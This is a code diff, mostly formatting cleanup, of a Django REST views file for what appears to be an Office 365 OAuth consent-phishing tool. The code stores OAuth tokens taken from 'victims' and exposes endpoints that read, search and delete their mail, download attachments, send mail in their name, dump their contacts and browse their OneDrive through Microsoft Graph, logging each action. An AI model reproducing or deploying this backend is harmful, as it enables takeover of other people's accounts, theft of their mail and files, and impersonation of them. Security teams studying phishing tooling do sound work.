@@ -1,5 +1,5 @@
-from base64 import b64decode
-from django.http import HttpResponse, Http404
+# from base64 import b64decode
+from django.http import Http404
 from django.shortcuts import redirect
 from django.views.decorators.csrf import csrf_exempt
 from rest_framework import status, mixins
@@ -10,7 +10,6 @@ from .helper import store_token, refresh_token, get_oauth_session, prune
 from rest_framework.views import APIView
 from rest_framework.schemas import AutoSchema
 from urllib.parse import unquote
-import io
 import json
 import logging
 import coreapi
@@ -21,8 +20,6 @@ import copy
 from rest_framework.parsers import MultiPartParser, FormParser
 
 logger = logging.getLogger('oauth.office365')
-
-
 
 
 @csrf_exempt
@@ -44,22 +41,21 @@ def token_callback(request):
             logger.error('Token callback did not include an authorization code parameter!')
             return redirect(app.conclude_redirect)
 
-
         scope = app.scopes.split(',')
 
         microsoft = get_oauth_session()
 
         token = microsoft.fetch_token(
             app.token_url,
-            client_secret= app.client_secret,
-            code= code,
-            scope= scope
+            client_secret=app.client_secret,
+            code=code,
+            scope=scope
         )
-
 
         store_token(app, token)
 
         return redirect(app.conclude_redirect)
+
 
 class Index(APIView):
     """
@@ -69,8 +65,9 @@ class Index(APIView):
 
     def get(self, request):
         victims = Victim.objects.all()
-        serializer = VictimSerializer(victims, many= True)
-        return Response({'victims' : serializer.data})
+        serializer = VictimSerializer(victims, many=True)
+        return Response({'victims': serializer.data})
+
 
 class ForceTokenRefresh(APIView):
     """
@@ -78,7 +75,7 @@ class ForceTokenRefresh(APIView):
     """
     def get(self, request, victim_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except Victim.DoesNotExist:
             raise Http404
 
@@ -92,42 +89,39 @@ class VictimDetailView(APIView):
     """
     List full details of a single victim
     """
-    
 
     def get(self, request, victim_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except Victim.DoesNotExist:
             raise Http404
 
         serializer = VictimDetailSerializer(victim)
 
-        return Response({ 'victim' : serializer.data })
+        return Response({'victim': serializer.data})
 
     def delete(self, request, victim_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except Victim.DoesNotExist:
             raise Http404
 
         victim.delete()
-        return Response(status = status.HTTP_204_NO_CONTENT)
-
-
+        return Response(status=status.HTTP_204_NO_CONTENT)
 
 
 class AppDetailViewGeneric(mixins.CreateModelMixin, mixins.UpdateModelMixin, generics.RetrieveDestroyAPIView):
-    #queryset = Application.objects.first()
+    # queryset = Application.objects.first()
     serializer_class = ApplicationSerializer
 
     def get_object(self):
         app = Application.objects.first()
-        #self.check_object_permissions(self.request, app)
+        # self.check_object_permissions(self.request, app)
 
         return app
 
     def post(self, request, *args, **kwargs):
-        logger.info('Created new OAuth application', extra={'user' : request.user})
+        logger.info('Created new OAuth application', extra={'user': request.user})
         return self.create(request, *args, **kwargs)
 
     def put(self, request, *args, **kwargs):
@@ -149,26 +143,27 @@ class AttachmentViewGeneric(generics.CreateAPIView):
         ]
     )
 
-    #TODO test validation works on fields
+    # TODO test validation works on fields
     def post(self, request, *args, **kwargs):
-        serializer = AttachmentSerializer(data= request.data)
-        serializer.is_valid(raise_exception= True)
+        serializer = AttachmentSerializer(data=request.data)
+        serializer.is_valid(raise_exception=True)
         headers = self.get_success_headers(serializer.data)
-        logger.info('Uploaded new file attachment %s', serializer.data['name'], extra={'user':request.user})
-        return Response(serializer.data, status=status.HTTP_201_CREATED, headers= headers)
+        logger.info('Uploaded new file attachment %s', serializer.data['name'], extra={'user': request.user})
+        return Response(serializer.data, status=status.HTTP_201_CREATED, headers=headers)
+
 
 class MessageViewGeneric(generics.CreateAPIView):
 
     serializer_class = MessageWrapperSerializer
 
     def post(self, request, *args, **kwargs):
-        serializer = MessageWrapperSerializer(data= request.data)
-        serializer.is_valid(raise_exception= True)
-        headers = self.get_success_headers(serializer.data)
-        
+        serializer = MessageWrapperSerializer(data=request.data)
+        serializer.is_valid(raise_exception=True)
+        # headers = self.get_success_headers(serializer.data)
+
         victim_id = kwargs.get('victim_id')
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
@@ -177,21 +172,21 @@ class MessageViewGeneric(generics.CreateAPIView):
         url = 'https://graph.microsoft.com/v1.0/me/sendMail'
 
         response_body = copy.deepcopy(serializer.data)
-        #print(response_body)
+        # print(response_body)
         for key, value in response_body.items():
             prune(response_body, key)
 
         json_data = JSONRenderer().render(response_body)
-        
-        #print(json_data)
-        ret = microsoft.post(url, data = json_data, headers= {'Content-type' : 'application/json'})
+
+        # print(json_data)
+        ret = microsoft.post(url, data=json_data, headers={'Content-type': 'application/json'})
         if ret.status_code == 202:
             logger.info("Sent email from %s", victim.email, extra={'user': request.user})
-            return Response({'status' : 'Message sent'})
+            return Response({'status': 'Message sent'})
         else:
             content = json.loads(ret.content)
             return Response(content)
-        
+
 
 class MailMessageView(APIView):
     """
@@ -214,36 +209,34 @@ class MailMessageView(APIView):
     )
 
     def get(self, request, victim_id):
-        
+
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
 
-        #pagination support
+        # pagination support
         if 'next' in request.GET:
-            next_unquoted = unquote( request.GET.get('next') )
-            logger.info('Paged mailbox contents for %s', victim.email, extra={'user' : request.user})
-            ret = microsoft.get( next_unquoted )
+            next_unquoted = unquote(request.GET.get('next'))
+            logger.info('Paged mailbox contents for %s', victim.email, extra={'user': request.user})
+            ret = microsoft.get(next_unquoted)
 
-        #support search
+        # support search
         elif 'search' in request.GET:
-            search_unquoted = unquote( request.GET.get('search') )
-            url = 'https://graph.microsoft.com/v1.0/me/messages?$format=json&$search="{0}"&$expand=attachments($select=id,name,size)'.format( search_unquoted )
-            logger.info('Searched %s mailbox for %s', victim.email, search_unquoted, extra={'user' : request.user})
+            search_unquoted = unquote(request.GET.get('search'))
+            url = 'https://graph.microsoft.com/v1.0/me/messages?$format=json&$search="{0}"&$expand=attachments($select=id,name,size)'.format(search_unquoted)
+            logger.info('Searched %s mailbox for %s', victim.email, search_unquoted, extra={'user': request.user})
             ret = microsoft.get(url)
 
         else:
 
             ret = microsoft.get('https://graph.microsoft.com/v1.0/me/messages?$format=json&$expand=attachments($select=id,name,size)')
-            logger.info('Requested mailbox contents for %s', victim.email, extra={'user' : request.user})
+            logger.info('Requested mailbox contents for %s', victim.email, extra={'user': request.user})
 
         content = json.loads(ret.content)
         return Response(content)
-
-
 
 
 class MailMessageDetail(APIView):
@@ -252,23 +245,22 @@ class MailMessageDetail(APIView):
     """
     def get(self, request, victim_id, id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
 
-        id_unquoted = unquote( id )
+        id_unquoted = unquote(id)
         url = 'https://graph.microsoft.com/v1.0/me/messages/{0}?$expand=attachments($select=id,name,size)'.format(id_unquoted)
         ret = microsoft.get(url)
 
         content = json.loads(ret.content)
         return Response(content)
 
-
     def delete(self, request, victim_id, id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
@@ -282,8 +274,9 @@ class MailMessageDetail(APIView):
             logger.info("Deleted email %s from %s inbox", id_unquoted, victim.email, extra={'user': request.user})
             content = json.dumps({'status': 'success'})
         else:
-            content = json.dumps({'status':'failed to delete message'})
+            content = json.dumps({'status': 'failed to delete message'})
         return Response(content)
+
 
 class MailAttachmentView(APIView):
     """
@@ -299,21 +292,22 @@ class MailAttachmentView(APIView):
             )
         ]
     )
+
     def get(self, request, victim_id, message_id, attachment_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
 
-        attachment_unquoted = unquote( attachment_id )
-        message_unquoted = unquote( message_id )
+        attachment_unquoted = unquote(attachment_id)
+        message_unquoted = unquote(message_id)
 
         url = 'https://graph.microsoft.com/v1.0/me/messages/{0}/attachments/{1}'.format(message_unquoted,
                                                                                         attachment_unquoted)
         ret = microsoft.get(url)
-        logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user':request.user})
+        logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user': request.user})
         if 'response_type' in request.GET and request.GET.get('response_type') == 'base64':
             # if user wants base64 (ex. requesting via api directly) we short-circuit file generation code and return the api response
             pass
@@ -324,10 +318,9 @@ class MailAttachmentView(APIView):
 
             base64_content = content.get('contentBytes')
             name = content.get('name')
-            buff = io.BytesIO(b64decode(base64_content))
+            # buff = io.BytesIO(b64decode(base64_content))
 
-            
-            response = Response({'data':base64_content, 'filename':name})
+            response = Response({'data': base64_content, 'filename': name})
             response['Content-Disposition'] = 'attachment; filename="{0}"'.format(name)
             return response
 
@@ -336,27 +329,28 @@ class MailAttachmentView(APIView):
 
     def delete(self, request, victim_id, message_id, attachment_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
 
-        attachment_unquoted = unquote( attachment_id )
-        message_unquoted = unquote( message_id )
+        attachment_unquoted = unquote(attachment_id)
+        message_unquoted = unquote(message_id)
 
         url = 'https://graph.microsoft.com/v1.0/me/messages/{0}/attachments/{1}'.format(message_unquoted,
                                                                                         attachment_unquoted)
         ret = microsoft.delete(url)
 
         content = json.loads(ret.content)
-        
+
         if ret.status_code == 204:
-            logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user':request.user})
+            logger.info("Downloaded attachment %s from message %s from %s inbox", attachment_unquoted, message_unquoted, victim.email, extra={'user': request.user})
             content = json.dumps({'status': 'success'})
         else:
-            content = json.dumps({'status':'failed to delete attachment'})
+            content = json.dumps({'status': 'failed to delete attachment'})
         return Response(content)
+
 
 class DumpUsersView(APIView):
     """
@@ -371,19 +365,20 @@ class DumpUsersView(APIView):
             )
         ]
     )
-    #TODO test this against my work account
+    # TODO test this against my work account
+
     def get(self, request, victim_id):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
 
-        #pagination support
+        # pagination support
         if 'next' in request.GET:
-            next_unquoted = unquote( request.GET.get('next') )
-            ret = microsoft.get( next_unquoted )
+            next_unquoted = unquote(request.GET.get('next'))
+            ret = microsoft.get(next_unquoted)
 
         else:
 
@@ -392,6 +387,7 @@ class DumpUsersView(APIView):
         content = json.loads(ret.content)
         logger.info("Dumped contacts for user %s", victim.email, extra={"user": request.user})
         return Response(content)
+
 
 class OneDriveView(APIView):
     """
@@ -411,14 +407,14 @@ class OneDriveView(APIView):
             )
         ]
     )
+
     def get(self, request, victim_id, id=None):
         try:
-            victim = Victim.objects.get(id= victim_id)
+            victim = Victim.objects.get(id=victim_id)
         except:
             raise Http404
 
         microsoft = get_oauth_session(victim)
-
 
         if id:
             if id == 'shared':
@@ -428,20 +424,18 @@ class OneDriveView(APIView):
                 url = 'https://graph.microsoft.com/v1.0/me/drive/items/{0}/children'.format(
                     unquote(request.GET.get('item_id')))
 
-
         elif 'search' in request.GET:
-            url = "https://graph.microsoft.com/v1.0/me/drive/search(q='{{{0}}}')".format( unquote(request.GET.get('search')) )
+            url = "https://graph.microsoft.com/v1.0/me/drive/search(q='{{{0}}}')".format(unquote(request.GET.get('search')))
 
         elif 'next' in request.GET:
-            url = unquote( request.GET.get('next') )
+            url = unquote(request.GET.get('next'))
 
         else:
             url = 'https://graph.microsoft.com/v1.0/me/drive/root/children'
-
 
         ret = microsoft.get(url)
 
         content = json.loads(ret.content)
 
-        logger.info("Listed OneDrive contents for %s", victim.email, extra={"user":request.user})
+        logger.info("Listed OneDrive contents for %s", victim.email, extra={"user": request.user})
         return Response(content)
